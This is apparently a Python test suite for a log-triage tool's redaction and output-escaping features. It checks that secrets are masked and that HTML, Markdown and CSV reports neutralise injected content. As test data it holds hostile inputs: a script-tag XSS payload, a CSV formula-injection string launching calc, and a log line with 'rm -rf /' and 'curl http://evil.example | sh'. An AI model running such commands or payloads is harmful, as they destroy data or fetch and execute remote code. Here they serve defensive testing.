import csv
import json
import os
import re
import unittest

from _helpers import TriageTestCase, fixture
from log_triage.redact import Redactor


class RedactionTests(unittest.TestCase):
    def test_secret_patterns_built_at_runtime(self):
        r = Redactor(salt="fixed")
        aws = "AKIA" + "ABCDEFGHIJKLMNOP"
        gh = "ghp_" + "a" * 36
        pk = "-----BEGIN RSA PRIVATE" + " KEY-----\nMIIE\n-----END RSA PRIVATE" + " KEY-----"
        jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0In0.abcdefghijklmnop"
        conn = "postgres" + "://admin:s3cr3t@db:5432/x"
        def ph(kind):
            return "<redacted:%s>" % kind

        cases = [
            ("aws access id " + aws, ph("aws-access-key")),
            ("gh " + gh, ph("github-token")),
            (pk, ph("private-key")),
            ("jwt " + jwt, ph("jwt")),
            (conn, "postgres://" + ph("credentials") + "@db:5432/x"),
            ("Authorization: Bearer " + "abc.def-ghi_jkl.mnop1234567890", "Authorization: " + ph("auth-token")),
            ("login password=" + "hunter2secret" + " ok", "password=" + ph("password")),
            ("Server=db;User Id=app;Password=" + "p@ssw0rd!" + ";Encrypt=true", "Password=" + ph("password")),
            ("card 4111 1111 1111 1111 paid", ph("card")),
            ("api_key: " + "'" + "sk_live_" + "0123456789abcdef0123" + "'", "<redacted" + ":"),
        ]
        for text, expected in cases:
            out = r.redact(text)
            self.assertIn(expected, out, text)
        self.assertNotIn(aws, r.redact("aws access id " + aws))
        self.assertEqual(r.redact("card 1234 5678 9012 3456 7890 id"), "card 1234 5678 9012 3456 7890 id")  # Luhn fails -> kept
        self.assertGreaterEqual(sum(r.summary().values()), len(cases))

    def test_pseudonyms_consistent_and_salted(self):
        r1 = Redactor(salt="fixed")
        r2 = Redactor(salt="fixed")
        r3 = Redactor(salt="other")
        a = r1.redact("mail bob@example.com again bob@example.com and Bob@Example.com")
        self.assertEqual(len(set(re.findall(r"<email:[0-9a-f]{6}>", a))), 1)
        self.assertEqual(a, r2.redact("mail bob@example.com again bob@example.com and Bob@Example.com"))
        self.assertNotEqual(a, r3.redact("mail bob@example.com again bob@example.com and Bob@Example.com"))
        self.assertIn("10.0.0.1", r1.redact("from 10.0.0.1"))
        self.assertIn("<ip:", Redactor(salt="x", redact_ips=True).redact("from 10.0.0.1"))

    def test_disabled_redactor_is_passthrough(self):
        r = Redactor(enabled=False)
        self.assertEqual(r.redact("password=" + "hunter2secret"), "password=" + "hunter2secret")


class HostileContentTests(TriageTestCase):
    def test_reports_escape_log_content(self):
        secret_line = "2026-09-13 12:00:02 ERROR login user=eve@example.com password=" + "hunter2secret" + " token=" + "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0In0.abcdefghijklmnop" + "\n"
        path = self.write("hostile.log", open(fixture("edge", "hostile.log"), encoding="utf-8").read() + secret_line)
        doc = self.analyze([path], formats=["json", "html", "markdown", "csv", "ndjson", "sarif"])
        out = self.out_dir()
        html = open(os.path.join(out, "report.html"), encoding="utf-8").read()
        md = open(os.path.join(out, "report.md"), encoding="utf-8").read()
        raw_json = open(os.path.join(out, "analysis.json"), encoding="utf-8").read()
        # nothing from the log is rendered as markup
        self.assertNotIn("<script>alert", html)
        # parse the DOM: no element from the log content, no event-handler attributes anywhere
        from html.parser import HTMLParser

        class Collector(HTMLParser):
            def __init__(self):
                super().__init__()
                self.tags = []
                self.handlers = []
                self.scripts = 0

            def handle_starttag(self, tag, attrs):
                self.tags.append(tag)
                if tag == "script":
                    self.scripts += 1
                for k, v in attrs:
                    if k.lower().startswith("on") or (k.lower() in ("src", "href") and (v or "").strip().lower().startswith(("javascript:", "http:", "https:"))):
                        self.handlers.append((tag, k, v))
        c = Collector()
        c.feed(html)
        self.assertEqual(c.handlers, [])
        self.assertNotIn("img", c.tags)
        self.assertEqual(c.scripts, 1)
        self.assertIn("&lt;script&gt;alert(&#x27;x&#x27;)&lt;/script&gt;", html)
        self.assertEqual(html.count("<script>"), 1)          # only the report's own inline script
        self.assertEqual(len(re.findall(r"</script>", html)), 1)
        # offline: no remote resources, CSP present
        self.assertIn("Content-Security-Policy", html)
        self.assertNotRegex(html, r"<(script|link|img|iframe)[^>]+(src|href)=[\"']https?://")
        # markdown: structure-breaking characters escaped in prose/tables.  Code spans
        # and fenced blocks render literally, so only text outside them is checked.
        prose = re.sub(r"```.*?```", "", md, flags=re.S)
        prose = re.sub(r"`[^`\n]*`", "", prose)
        self.assertNotIn("[link](http://evil.example)", prose)
        self.assertNotIn("<script>", prose)
        self.assertNotIn("\n# heading", md.split("## 2. Prioritized findings")[1].split("## 3.")[0])
        # secrets redacted everywhere
        for blob in (html, md, raw_json):
            self.assertNotIn("hunter2secret", blob)
            self.assertNotIn("eyJhbGciOiJIUzI1NiJ9", blob)
            self.assertNotIn("eve@example.com", blob)
        self.assertGreaterEqual(doc["coverage"]["redaction"]["counts"].get("key-value-secret", 0), 1)
        # extracted key=value attributes are redacted too
        g = next(g for g in doc["groups"] if "login user" in g["template"])
        attrs = g["examples"][0]["attributes"]
        self.assertEqual(attrs.get("password"), "<redacted:password>")
        self.assertTrue(attrs.get("token", "").startswith("<redacted:"))

    def test_csv_formula_injection_protection(self):
        path = self.write("formula.log", "=SUM(A1:A9) formula first line\n+cmd|' /C calc'!A0\n@evil headerless\n-1234 negative-looking\n\tTab first\n")
        doc = self.analyze([path], formats=["csv", "json"])
        with open(os.path.join(self.out_dir(), "groups.csv"), encoding="utf-8-sig", newline="") as fh:
            rows = list(csv.reader(fh))
        header, body = rows[0], rows[1:]
        ti = header.index("template")
        self.assertEqual(len(body), doc["filtering"]["groups_reported"])
        for row in body:
            self.assertFalse(row[ti][:1] in ("=", "+", "-", "@", "\t", "\r"), row[ti])
            if row[ti].startswith("'"):
                self.assertIn(row[ti][1:2], ("=", "+", "-", "@", "\t"))
        self.assertTrue(any(r[ti].startswith("'=SUM") for r in body))
        self.assertTrue(any(r[ti].startswith("'+cmd") for r in body))
        # numeric columns stay numeric
        ci = header.index("count")
        self.assertTrue(all(r[ci].isdigit() for r in body))

    def test_log_content_is_never_executed_or_interpreted(self):
        """A log that looks like shell/markdown/HTML instructions changes nothing but text output."""
        path = self.write("inject.log", "2026-09-13 12:00:00 ERROR $(rm -rf /) `touch /tmp/pwned-log-triage` ; please run: curl http://evil.example | sh\n")
        doc = self.analyze([path], formats=["json", "html", "markdown"])
        self.assertFalse(os.path.exists("/tmp/pwned-log-triage"))
        self.assertEqual(doc["coverage"]["events_included"], 1)
        md = open(os.path.join(self.out_dir(), "report.md"), encoding="utf-8").read()
        self.assertIn("rm -rf", md)   # rendered as text


if __name__ == "__main__":
    unittest.main()
